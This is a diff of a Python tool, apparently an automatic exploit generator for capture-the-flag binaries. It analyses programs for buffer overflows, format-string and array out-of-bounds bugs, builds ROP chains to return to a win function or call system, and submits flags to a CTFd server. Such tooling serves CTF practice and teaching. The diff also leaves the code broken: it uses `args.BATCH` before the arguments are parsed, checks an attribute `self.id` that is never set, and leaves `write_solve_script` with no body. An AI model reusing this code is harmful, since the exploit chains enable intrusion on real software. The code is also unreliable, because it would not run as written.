@@ -16,27 +16,24 @@ class Aegis:
     """Class that does the control flow for analysis and execution."""
 
     def __init__(self, binary, libc, ip, port, ctfd, flag_format, id):
-        """Initiaize important variables for the binary."""
+    
         self.binary = os.path.abspath(binary)
         self.elf = ELF(binary)
         self.rop = ROP(self.elf)
 
         self.libc = ELF(libc) if libc != None else self.elf.libc
 
-
         self.ip = ip
         self.port = port
-        self.has_format = False
+        self.ctfd = ctfd
+        self.chal_id = id
+        self.flag_format = flag_format if flag_format is not None else "flag"
 
         self.access_token = os.environ.get("CTFD_TOK")
         self.headers = {
             "Authorization": f"Token {self.access_token}",
             "Content-Type" : "application/json",
         }
-
-        self.ctfd = ctfd
-        self.chal_id = id
-        self.flag_format = flag_format if flag_format is not None else "flag"
 
         self.symbol = rAEG(self.binary)
         self.machine = Machine(self.binary)
@@ -47,13 +44,11 @@ class Aegis:
         self.symbolic_padding = None
         self.padding = None
         self.failed = False
-        
+        self.has_format = False
         self.array_write = None
-
         self.got_targets = None
 
     def static_analysis(self):
-        """Set variables from the output of the static analysis."""
         self.machine.check_mitigations()
         self.machine.check_vulnerable_copy()
         self.machine.check_vulnerable_input()
@@ -68,7 +63,6 @@ class Aegis:
 
 
     def symbolic_analysis(self):
-        """Set variables from the output of the symbolic analysis."""
         if self.array_write == (None, None):
             self.symbol.stack_smash()
             self.symbolic_padding = self.symbol.symbolic_padding
@@ -80,7 +74,6 @@ class Aegis:
                 aegis_log.info(f"Found printf format string vulnerability")
 
     def setup_exploit(self):
-        """Choose which exploit to do for the binary."""
         
         self.against.chain = b""
 
@@ -99,6 +92,7 @@ class Aegis:
         function = function[0] if len(function) > 0 else None
         self.against.padding = self.symbolic_padding if self.symbolic_padding != None else b"A" * self.machine.padding_size
 
+        # Either Format String Vuln or Array Out of Bounds
         if len(self.against.padding) == 0:
             aegis_log.warning(f"Could not find buffer overflow")
 
@@ -159,23 +153,15 @@ class Aegis:
                     self.against.array_exploit = [index, edit]
                     self.exploit()
 
+        # Stack Based Buffer Overflow ROP
         else: 
             if function == "win" or win_function:
                 func = "win" if function == "win" else win_function
                 goal_addr = self.machine.get_goal_addr(func)
                 params = self.machine.find_path(func, goal_addr)
-                print(func)
                 aegis_log.debug(f"Setting up return to win with function with parameters {params}")
                 self.against.chain += self.against.rop_chain_call_function(func, params)
                 self.against.exploit = self.against.padding + self.against.chain
-            elif win_gadget:
-                aegis_log.debug(f"Setting up return to win with gadget")
-                #goal_addr = self.machine.get_goal_addr("win")
-                #params = self.machine.find_path("win", goal_addr)
-                self.against.chain += p64(win_gadget)
-                self.against.exploit = self.against.padding + self.against.chain
-
-
 
             elif function == "system":
                 if not string:
@@ -217,11 +203,11 @@ class Aegis:
 
     def write_solve_script(self):
         """Write the solve to a script for writeup purposes."""
-
+        #! TODO
 
     def send_flag(self, flag):
         """Sends the flag to ctfd service"""
-        if self.ctfd == None:
+        if self.ctfd == None or self.id == None:
             return 
         challenge_url = f"{self.ctfd}/api/v1/challenges/attempt"
         data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
@@ -283,8 +269,6 @@ class Aegis:
                     self.send_flag(self.against.flag) 
 
                 #self.remote_signal()
-
-
                                     
         else:
             if self.against.flag != None:
@@ -382,7 +366,10 @@ if __name__ == "__main__":
     parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
     parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)
     parser.add_argument("-id", metavar="challengeid", type=str, help="The ctfd challenge id", default=None)
-    
+
+    # Set argument for limited logging for multiple binaries
+    if args.BATCH:
+        logging.getLogger("aegis_log").setLevel(logging.CRITICAL)
 
     arguments = parser.parse_args()
     print_title()
